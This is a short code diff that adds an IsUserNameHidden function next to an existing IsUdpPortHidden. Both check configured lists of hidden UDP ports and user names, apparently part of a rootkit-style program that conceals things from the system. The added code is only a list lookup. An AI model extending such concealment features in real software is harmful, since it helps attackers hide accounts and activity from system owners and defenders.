@@ -87,3 +87,7 @@ BOOL IsUdpPortHidden(USHORT port)
 {
 	return Configuration && IntegerListContains(Configuration->HiddenUdpPorts, port);
 }
+BOOL IsUserNameHidden(LPCWSTR name)
+{
+	return Configuration && StringListContains(Configuration->HiddenUserNames, name);
+}
